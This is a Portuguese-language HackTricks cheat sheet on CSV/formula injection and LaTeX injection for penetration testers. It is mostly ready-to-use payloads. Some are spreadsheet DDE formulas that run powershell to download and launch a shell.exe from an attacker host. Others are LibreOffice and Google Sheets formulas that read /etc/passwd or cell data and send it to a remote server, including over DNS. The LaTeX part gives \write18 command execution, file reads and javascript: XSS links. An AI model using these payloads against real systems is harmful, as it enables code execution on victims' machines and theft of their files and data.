# Inje√ß√£o de F√≥rmula/CSV/Doc/LaTeX/GhostScript

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que importam mais para que voc√™ possa corrigi-las mais r√°pido. O Intruder rastreia sua superf√≠cie de ataque, executa varreduras proativas de amea√ßas, encontra problemas em toda a sua pilha tecnol√≥gica, de APIs a aplicativos web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Inje√ß√£o de F√≥rmula

### Informa√ß√µes

Se a sua **entrada** est√° sendo **refletida** dentro de **arquivos CSV** (ou qualquer outro arquivo que provavelmente ser√° aberto pelo **Excel**), voc√™ pode ser capaz de inserir **f√≥rmulas** do Excel que ser√£o **executadas** quando o usu√°rio **abrir o arquivo** ou quando o usu√°rio **clicar em algum link** dentro da planilha do Excel.

{% hint style="danger" %}
Atualmente, o **Excel alertar√°** (v√°rias vezes) o **usu√°rio quando algo for carregado de fora do Excel** para preveni-lo de a√ß√µes maliciosas. Portanto, um esfor√ßo especial em Engenharia Social deve ser aplicado ao payload final.
{% endhint %}

### [Lista de Palavras](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hyperlink

**O exemplo a seguir √© muito √∫til para exfiltrar conte√∫do da planilha final do Excel e realizar solicita√ß√µes para locais arbitr√°rios. No entanto, requer que o usu√°rio clique no link (e aceite os avisos de seguran√ßa).**

Exemplo retirado de [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Vamos assumir um cen√°rio de ataque no sistema de Gerenciamento de Registros de Estudantes de uma escola. O aplicativo permite que o professor insira detalhes dos alunos na escola. O atacante obt√©m acesso ao aplicativo e quer que todos os professores que usam o aplicativo sejam comprometidos. Ent√£o, o atacante tenta realizar um ataque de inje√ß√£o de CSV por meio do aplicativo web.
O atacante precisa roubar detalhes de outros alunos. Ent√£o, ele usa a f√≥rmula Hyperlink e a insere ao digitar os detalhes do aluno.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_008.png)

Quando o professor exporta o CSV e clica no hyperlink, os dados sens√≠veis s√£o enviados para o servidor do atacante.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_009.png)

O arquivo CSV exportado cont√©m um payload malicioso.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_010.png)

Os detalhes do aluno s√£o registrados no servidor web do atacante.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_011.png)

### RCE

Para que este exemplo funcione, √© **necess√°rio habilitar a seguinte configura√ß√£o**:\
Arquivo ‚Üí Op√ß√µes ‚Üí Central de Confiabilidade ‚Üí Configura√ß√µes da Central de Confiabilidade ‚Üí Conte√∫do Externo ‚Üí Habilitar Inicializa√ß√£o do Servidor de Troca Din√¢mica de Dados\
ou o uso de uma **vers√£o antiga do Excel**.

A boa not√≠cia √© que **este payload √© executado automaticamente quando o arquivo √© aberto** (se o usu√°rio aceitar os avisos).

√â poss√≠vel executar uma calculadora com o seguinte payload **`=cmd|' /C calc'!xxx`**

![](<../.gitbook/assets/image (25) (2) (2) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (8).png>)

### Mais
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LFI

**LibreOffice Calc**

* Isto ler√° a 1¬™ linha do arquivo local /etc/passwd: `='file:///etc/passwd'#$passwd.A1`
* Ex-filtrar: `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)))`
* Ex-filtrar mais de uma linha: `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* Exfiltra√ß√£o DNS: `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),"."))`

**Analisando o payload de exfiltra√ß√£o DNS:**

* ‚Äòfile:///etc/passwd‚Äô#$passwd.A19 ‚Äì Ler√° a 19¬™ linha do arquivo local /etc/passwd
* ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19) ‚Äì Codifica a URL dos dados retornados
* MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41) ‚Äì Semelhante a substring, l√™ dados do 1¬∫ ao 41¬∫ caractere ‚Äì uma maneira muito √∫til de restringir o comprimento dos hostnames DNS (limite de 254 caracteres em FQDN e 63 caracteres para um r√≥tulo, ou seja, subdom√≠nio)
* SUBSTITUTE(MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41),‚Äù%‚Äù,‚Äù-‚Äú) ‚Äì substitui todas as inst√¢ncias de % (o caractere especial da codifica√ß√£o de URL) por tra√ßo ‚Äì isso garante que apenas caracteres DNS v√°lidos sejam usados
* CONCATENATE((SUBSTITUTE(MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41),‚Äù%‚Äù,‚Äù-‚Äú)),‚Äù.\<FQDN>‚Äù) ‚Äì Concatena a sa√≠da do arquivo (ap√≥s o processamento acima) com o FQDN (para o qual temos acesso ao host que √© autoritativo para o dom√≠nio)
* WEBSERVICE ‚Äì Far√° uma solicita√ß√£o para este nome DNS inexistente que podemos ent√£o analisar os logs (ou executar tcpdump etc.) no servidor de nome DNS autoritativo para o qual temos controle

### Exfiltra√ß√£o de Dados OOB no Google Sheets

Primeiramente, vamos introduzir algumas das fun√ß√µes mais interessantes.

**CONCATENATE**: Anexa strings uma √† outra.
```
=CONCATENATE(A2:E2)
```
**IMPORTXML**: Importa dados de v√°rios tipos de dados estruturados, incluindo XML, HTML, CSV, TSV e feeds XML RSS e ATOM.
```
=IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")
```
**IMPORTFEED**: Importa um feed RSS ou ATOM.
```
=IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))
```
**IMPORTHTML**: Importa dados de uma tabela ou lista dentro de uma p√°gina HTML.
```
=IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
```
**IMPORTRANGE**: Importa um intervalo de c√©lulas de uma planilha especificada.
```
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
```
**IMAGE**: Insere uma imagem em uma c√©lula.
```
=IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
```
## Inje√ß√£o LaTeX

Geralmente, os servidores que voc√™ encontrar√° na internet que **convertem c√≥digo LaTeX em PDF** usam **`pdflatex`**.\
Este programa utiliza 3 principais atributos para (des)permitir a execu√ß√£o de comandos:

* **`--no-shell-escape`**: **Desabilita** a constru√ß√£o `\write18{command}`, mesmo que esteja habilitada no arquivo texmf.cnf.
* **`--shell-restricted`**: Igual a `--shell-escape`, mas **limitado** a um conjunto 'seguro' de **comandos pr√©-definidos** (\*\*No Ubuntu 16.04 a lista est√° em `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`**: **Habilita** a constru√ß√£o `\write18{command}`. O comando pode ser qualquer comando do shell. Esta constru√ß√£o normalmente √© proibida por raz√µes de seguran√ßa.

No entanto, existem outras maneiras de executar comandos, ent√£o para evitar RCE √© muito importante usar `--shell-restricted`.

### Ler arquivo <a href="#read-file" id="read-file"></a>

Voc√™ pode precisar ajustar a inje√ß√£o com inv√≥lucros como \[ ou $.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Ler arquivo de linha √∫nica
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Ler arquivo de m√∫ltiplas linhas
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### Escrever arquivo <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Execu√ß√£o de comando <a href="#command-execution" id="command-execution"></a>

A entrada do comando ser√° redirecionada para stdin, use um arquivo tempor√°rio para obt√™-la.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Se voc√™ receber algum erro de LaTex, considere usar base64 para obter o resultado sem caracteres ruins.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

De [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Inje√ß√£o Ghostscript

TODO: Criar um resumo com as informa√ß√µes e t√©cnicas mais relevantes de [https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

## Refer√™ncias

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que importam mais para que voc√™ possa corrigi-las mais r√°pido. Intruder rastreia sua superf√≠cie de ataque, executa varreduras proativas de amea√ßas, encontra problemas em toda a sua pilha tecnol√≥gica, de APIs a aplicativos web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
